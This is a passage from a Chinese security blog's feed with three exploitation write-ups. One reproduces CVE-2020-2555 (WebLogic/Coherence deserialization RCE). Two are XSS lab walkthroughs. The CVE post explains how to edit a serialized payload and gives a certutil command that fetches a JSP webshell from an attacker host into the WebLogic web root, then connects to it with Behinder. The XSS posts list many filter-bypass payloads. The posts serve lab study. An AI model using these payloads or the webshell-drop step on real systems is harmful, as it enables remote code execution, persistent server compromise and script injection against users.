    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;amp;CK实战系列——红队评估（四）靶场环境，下载地址：&lt;</summary>
      
    
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555复现</title>
    <link href="http://lvpsectime.github.io/2020/05/12/CVE-2020-2555%E5%A4%8D%E7%8E%B0/"/>
    <id>http://lvpsectime.github.io/2020/05/12/CVE-2020-2555%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-12T12:42:45.000Z</published>
    <updated>2020-12-07T06:14:12.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2020年3月6日，Oracle Coherence 反序列化远程代码执行漏洞（<code>CVE-2020-2555</code>）的细节被公开，Oracle Coherence为Oracle融合中间件中的产品，在<code>WebLogic 12c</code>及以上版本中默认集成到<code>WebLogic</code>安装包中，攻击者通过<code>t3</code>协议发送构造的序列化数据，能过造成命令执行的效果</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-1.png" alt="cve-2020-2555-1.png"></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle Coherence 3.7.1.17</span><br><span class="line">Oracle Coherence &amp; Weblogic 12.1.3.0.0</span><br><span class="line">Oracle Coherence &amp; Weblogic 12.2.1.3.0</span><br><span class="line">Oracle Coherence &amp; Weblogic 12.2.1.4.0</span><br><span class="line">Weblogic 10.3.6.0 版本不受影响范围内，虽然该版本默认自带了 Coherence（3.7），通过调试发现该版本默认并未启用 Coherence，所以 Weblogic 10.3.6.0 不在受影响范围内。</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java jdk 1.7</span><br><span class="line">weblogic 12.1.3.0.0</span><br><span class="line">IP: 192.168.150.142</span><br><span class="line">端口： 7001</span><br></pre></td></tr></table></figure><p><a href="#">详细搭建weblogic教程</a></p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-2.png" alt="cve-2020-2555-2.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>在 GitHub 上找到poc</p><p><a href="https://github.com/wsfengfan/CVE-2020-2555">https://github.com/wsfengfan/CVE-2020-2555</a></p><p><a href="https://github.com/0nise/CVE-2020-2555">https://github.com/0nise/CVE-2020-2555</a></p><p>我们现在在kali上发送一个弹出计算器的payload试一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-3.png" alt="cve-2020-2555-3.png"></p><p>3个参数：IP、端口7001、执行的对象</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-4.png" alt="cve-2020-2555-4.png"></p><p>成功弹出计算器</p><p>与某些命令执行的payload的不同的是，不是直接修改代码命令，而是payload在执行的对象里</p><p>这里我们直接打开上面的<code>121300_calc.666</code>，可以看到里面大部分都是乱码，也有一些明文。</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-5b0d96eeddf67b56c.png" alt="cve-2020-2555-5b0d96eeddf67b56c.png"></p><p>其实这个对象文件要用二进制形式打开</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-6.png" alt="cve-2020-2555-6.png"></p><p>那么是不是我们把里面的 <code>calc</code> 改成 <code>notepad</code> 就能弹出一个记事本呢？其实不是。</p><p>仔细观察，我们可以发现</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-7.png" alt="cve-2020-2555-7.png"></p><p><code>74 00</code> 出现好几次，像是一个标志位，后面跟着的十六进制是后面命令的长度，比如<code>cmd</code>是三个长度，所以<code>74 00</code>后面是<code>03</code>，<code>calc</code>是4个长度，后面是<code>04</code>。</p><p>而且执行命令的后面的一串是固定格式</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-8.png" alt="cve-2020-2555-8.png"></p><p>所以我们要想弹出一个记事本，需要以下几步：</p><ol><li><p>把最后的固定格式剪切报存起来</p></li><li><p>新建hex文件，写入<code>notepad</code>得到十六进制</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-9.png" alt="cve-2020-2555-9.png"></p></li><li><p>把原文件中的十六进制的<code>calc</code>替换为<code>notepad</code>的十六进制，把<code>74 00</code>后面的<code>04</code>改为<code>07</code></p></li><li><p>把固定格式粘贴到notepad的十六进制后面，保存即可</p></li></ol><p>把文件名改为<code>121300_notepad</code>，kali上发包</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-10.png" alt="cve-2020-2555-10.png"></p><p>成功弹出记事本</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>不过显然我们要弹出一个计算器有什么用？所以我们需要构造符合我们要求的payload。</p><p>我们现在可以执行命令，所以我们常用的利用方式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">远程下载</span><br><span class="line">写shell</span><br></pre></td></tr></table></figure><p>这次我选择远程下载木马到目标主机上。不过这又出现一个问题，就是我们把shell下载到哪呢？这个就需要百度了。</p><p>我本地的weblogic的网站根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br></pre></td></tr></table></figure><p>但是不是所有的都是一样的，不过后面一部分是一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">......\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br></pre></td></tr></table></figure><p>所以我们就需要获取前面这一部分了。这里就要介绍一个<strong>骚操作</strong>了。</p><p><strong>利用环境变量获取前面这一部分，比如<code>cd</code>返回的就是当前目录。</strong></p><p>这里我们测试一下，构造获取payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo %cd% &gt; c:/cd.txt</span><br><span class="line">这里cd需要用两个%包含，Linux下用$cd</span><br></pre></td></tr></table></figure><p>与上面构造弹出notepad的payload的方式一样，在kali上执行成功。</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-11.png" alt="cve-2020-2555-11.png"></p><p>接下来我们构造真正的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%cd%\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.150.141/shell.jsp %cd%\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\shell.jsp</span><br></pre></td></tr></table></figure><p>构造执行的对象</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-12.png" alt="cve-2020-2555-12.png"></p><p>在kali上执行</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-135861c2591085ed79.png" alt="cve-2020-2555-135861c2591085ed79.png"></p><p>网站根目录下生成<code>shell.jsp</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-14.png" alt="cve-2020-2555-14.png"></p><p>在浏览器上访问的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.150.142:7001/bea_wls_internal/shell.jsp</span><br></pre></td></tr></table></figure><p>用冰蝎连接</p><p><img src="http://www.sectime.top:8888/images/2020/05/13/cve-2020-2555-15.png" alt="cve-2020-2555-15.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是CVE-2020-2555漏洞利用的全过程。</p><p>从这个过程中学到很多技巧</p><ol><li>利用环境变量获取网站根目录</li><li>理解poc，修改poc</li><li>poc -&gt; exp</li><li>获取shell之后，可以获取weblogic的密文和key，从而解密</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;2020年3月6日，Oracle Coherence 反序列化远程代码执行漏洞（&lt;code&gt;CVE-2020-2555&lt;/c</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="http://lvpsectime.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习二</title>
    <link href="http://lvpsectime.github.io/2020/05/04/XSS%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%BA%8C/"/>
    <id>http://lvpsectime.github.io/2020/05/04/XSS%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%BA%8C/</id>
    <published>2020-05-04T09:39:19.000Z</published>
    <updated>2020-05-04T13:08:57.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p><p><img src="/.io//1.png"></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>name变量通过<code>GET</code>方式传入，直接带入到标签中，没有任何过滤。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码</p><p><img src="/.io//2.png"></p><p>发现输入的<code>&lt;、&gt;</code>被<code>html</code>编码了。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=&quot;center&quot;&gt;没有找到和INPUT_POINT相关的结果.&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>另一处在标签属性处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;INPUT_POINT&quot;&gt;</span><br></pre></td></tr></table></figure><p>对左右尖括号<code>&lt;,&gt;</code>被转化成<code>HTML</code>字符实体(HTML Entity)的情况，想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1)//</span><br></pre></td></tr></table></figure><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p><p>只是level 3中<code>value=&#39;&#39;</code>，而level 4中的<code>value=&quot;&quot;</code>，所以要闭合<code>value</code>上面要用<code>&#39;</code>，此处要用<code>&quot;</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(1)//</span><br></pre></td></tr></table></figure><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="/.io//3.png"></p><p><code>on</code> 替换为 <code>o_n</code>，<code>script</code> 替换为 <code>sc_ript</code><br>因此不能再考虑用事件触发，也不能用<code>script</code>标签触发。</p><p><strong>payload</strong></p><p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;111&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>在上一关限制的基础上，将所有的属性，如<code>src</code>、<code>href</code>等等都进行转换。</p><p>此处可用大小写混合绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</span><br><span class="line">&quot;&gt; &lt;Script&gt;alert(&#x27;handsome boy&#x27;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt; &lt;img Src=x OnError=alert(&#x27;xss&#x27;)&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><code>href</code>, <code>on</code>, <code>script</code>等关键字被删除了。</p><p>此处可用双写关键字绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonninput=alert(1) &quot;</span><br><span class="line">&quot;&gt; &lt;scscriptript&gt;alert`xss`&lt;/scscriptript&gt; //</span><br></pre></td></tr></table></figure><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成<code>HTML</code>实体，无法截断属性。<br>由于<code>script</code>关键字被过滤，得考虑绕过方式，使用<code>HTML</code>实体字符绕过<br><code>HTML16</code>编码<br><code>HTML10</code>编码</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/1/)</span><br><span class="line">javascript:%61lert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert`1`</span><br><span class="line">javasc&amp;#x0072;ipt:alert`1`</span><br></pre></td></tr></table></figure><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p><p><strong>payload</strong></p><p><strong>记得替换<code>script</code>，比如用<code>&amp;#x72;</code>替换r</strong><br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)//http://www.0aa.me  //利用注释</span><br><span class="line">javascript:%0dhttp://www.0aa.me%0dalert(1)  //不能用注释的情况下</span><br></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>可以看出这里<code>keyword</code>变量依然没戏，被<code>HTML</code>实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 level 10 类似，寻找新的注入点。<br>原来的<code>t_sort</code>的双引号被过滤了。<br>这次注入点是在 <code>HTTP Request Header</code> 请求头的 <code>Refer</code> 字段。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=alert`1` &quot;</span><br></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一题和上一题类似，只是这里的漏洞点出现在了<code>HTTP</code>请求头的<code>User-Agent</code>。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用<code>cookie</code>中的参数注入。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;XSS&#x27;) //</span><br></pre></td></tr></table></figure><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>看了先知的wp，才知道是图片exif 藏有xss payload。<a href="https://xianzhi.aliyun.com/forum/read/1462.html?page=2">https://xianzhi.aliyun.com/forum/read/1462.html?page=2</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include 指令</a></p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p><p>发现可以包含第一关的页面</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=‘level1.php?name=&lt;img src=x onerror=alert(1)&gt;‘</span><br></pre></td></tr></table></figure><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p><p>可以使用如下符号替代空格</p><p><img src="/.io//4.png"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img%0asrc=x%0aonerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://test.ctf8.com/&quot;&gt;http://test.ctf8.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img </summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS靶场练习一</title>
    <link href="http://lvpsectime.github.io/2020/05/02/XSS%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%B8%80/"/>
    <id>http://lvpsectime.github.io/2020/05/02/XSS%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%B8%80/</id>
    <published>2020-05-02T12:54:12.000Z</published>
    <updated>2020-05-06T02:22:51.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1">alert(1) to win</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span>+s+<span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)//</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure><h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &#x27;\\&quot;&#x27;);</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s + &#x27;&quot;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/.io//1.png" alt="replace"></p><p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p><ul><li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li><li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)//</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)//</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&#x27; + s + &#x27;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/.io//2.png" alt="JSON.stringify"></p><p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &#x27;&amp;lt;&#x27;).replace(/&quot;/g, &#x27;&amp;quot;&#x27;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &#x27;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&#x27;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &#x27;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&#x27;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p><ol><li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li><li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li><li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li></ol><p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[a|http://onerror=alert(1)//]]</span><br></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    // Slightly too lazy to make two input fields.</span><br><span class="line">    // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">    // Only slightly contrived at this point.</span><br><span class="line">    var a = document.createElement(&#x27;div&#x27;);</span><br><span class="line">    a.appendChild(document[&#x27;create&#x27; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p><p><strong>常用命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 